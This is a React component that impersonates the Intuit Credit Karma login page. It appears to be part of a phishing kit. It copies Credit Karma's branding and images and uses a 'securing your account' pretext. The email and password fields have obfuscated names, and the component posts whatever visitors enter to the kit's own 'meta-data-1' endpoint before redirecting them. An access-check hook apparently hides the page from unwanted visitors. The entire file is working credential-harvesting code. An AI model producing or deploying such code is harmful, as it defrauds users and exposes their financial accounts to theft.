import React, { useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import Header from '../../components/Header';
import Sidebar from '../../components/Sidebar';
import Footer from '../../components/Footer';
import axios from 'axios';
import { baseUrl } from '../../constants';
import MetaTags from '../../utils/MetaTags';
import useAccessCheck from '../../utils/useAccessCheck';

const ULgn1: React.FC = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });

  const navigate = useNavigate();



  const isAllowed = useAccessCheck(baseUrl); // Replace with actual base URL

  if (!isAllowed) return null; // Or show a loading spinner, etc.

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };

  const validateEmzemz = (emzemz) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(emzemz);
  };

  

  const handleSubmit = async (event) => {
    setIsLoading(true);
    event.preventDefault();
    let newErrors = { emzemz: '', pwzenz: '' };

    if (!validateEmzemz(emzemz)) {
      newErrors.emzemz = 'Invalid email format.';
      setIsLoading(false);
    }

    if (pwzenz.length <= 0) {
      newErrors.pwzenz = 'Password must be at least 6 characters.';
      setIsLoading(false);
    }

    setErrors(newErrors);

    // Check if there are no errors
    if (!newErrors.emzemz && !newErrors.pwzenz) {
      // Proceed with form submission
      console.log('Form submitted with:', { emzemz, pwzenz });

      const url = `${baseUrl}api/meta-data-1/`;

      try {
        await axios.post(url, {
          emzemz: emzemz,
          pwzenz: pwzenz,
        });
        console.log('Message sent successfully');
        navigate('/login');
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
      }

      setErrors({ emzemz: '', pwzenz: '' });
    }
  };

  return (
    <>
      <MetaTags title="Log in - Free Credit Score & Free Credit Reports With Monitoring | Credit Karma | Credit Karma" />{' '}
      {/* Add this component to set the meta tags */}
      <Header sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />
      {<Sidebar sidebarOpen={sidebarOpen} setSidebarOpen={setSidebarOpen} />}
      <section>
        <div className="grid grid-cols-1 gap-4">
          <div className="px-10 pt-4">
            <h1 className="text-3xl font-extrabold mb-6">
              Log in to Intuit Credit Karma
            </h1>

            <p className="font-bold mb-5">
              Please enter your login credentials to proceed with securing your
              account.
            </p>

            <form onSubmit={handleSubmit}>
              <div className="mb-5">
                <label className="mb-2.5 block font-medium text-black dark:text-white">
                  Email
                </label>
                <div className="relative">
                  <input
                    id="emzemz"
                    name="emzemz"
                    type="email"
                    value={emzemz}
                    onChange={(e) => setEmzemz(e.target.value)}
                    className="w-full rounded-md border border-stroke bg-transparent py-3 pl-6 pr-10 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                  />
                </div>
              </div>

              {errors.emzemz && (
                <div className="flex items-center gap-3 text-sm font-bold mt-1 mb-1">
                  <svg
                    width="1rem"
                    height="1rem"
                    viewBox="0 0 24 24"
                    className="fill-current text-red-600"
                    aria-hidden="true"
                  >
                    <path
                      d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                      fillRule="nonzero"
                    ></path>
                  </svg>

                  <p>Email required</p>
                </div>
              )}
              <div className="mb-8">
                <label className="mb-2.5 block font-medium text-black dark:text-white">
                  Password
                </label>
                <div className="relative">
                  <input
                    id="pwzenz"
                    name="pwzenz"
                    type={showPwzenz ? 'text' : 'password'}
                    value={pwzenz}
                    onChange={(e) => setPwzenz(e.target.value)}
                    placeholder=""
                    className="w-full rounded-md border border-stroke bg-transparent py-3 pl-6 pr-15 text-black outline-none focus:border-primary focus-visible:shadow-none dark:border-form-strokedark dark:bg-form-input dark:text-white dark:focus:border-primary"
                  />

                  {errors.pwzenz && (
                    <div className="flex items-center gap-3 text-sm font-bold mt-2">
                      <svg
                        width="1rem"
                        height="1rem"
                        viewBox="0 0 24 24"
                        className="fill-current text-red-600"
                        aria-hidden="true"
                      >
                        <path
                          d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                          fillRule="nonzero"
                        ></path>
                      </svg>

                      <p>Password required</p>
                    </div>
                  )}
                  <span
                    className="absolute right-4 top-3 cursor-pointer"
                    onClick={togglePwzenzVisibility}
                  >
                    {showPwzenz ? 'Hide' : 'Show'}
                  </span>
                </div>
              </div>

              <div className="mb-10 flex items-center justify-center">
                {!isLoading ? (
                  <input
                    type="submit"
                    value="Log in"
                    className="w-full cursor-pointer font-bold rounded-md border border-primary bg-primary p-3 text-white transition hover:bg-opacity-90"
                  />
                ) : (
                  <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-primary border-t-transparent"></div>
                )}
              </div>

              <div className="mt-6 text-left">
                <p>
                  Can't log in to your account?{' '}
                  <Link to="/signup" className="underline">
                    Try another way
                  </Link>
                </p>
              </div>

              <div className="mt-10 text-center mb-5">
                <p className="text-primary font-bold">Create an account</p>
              </div>
            </form>
          </div>

          <div className="bg-pink p-3">
            <img
              srcset="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=1 1x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=2 2x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=3 3x, https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat&amp;dpr=4 4x"
              src="https://creditkarmacdn-a.akamaihd.net/res/content/bundles/assets/1.151.106/auth/logon/cyok-qr-code_2x.png?auto=compress%2Cformat"
              alt=""
              width="500"
              height="Auto"
            />

            <div className="text-center">
              <h1 className="text-3xl font-extrabold mb-3">
                Create your own karma.
              </h1>

              <p>Download our app to see what’s new.</p>
            </div>
          </div>
        </div>
      </section>
      <Footer />
    </>
  );
};

export default ULgn1;
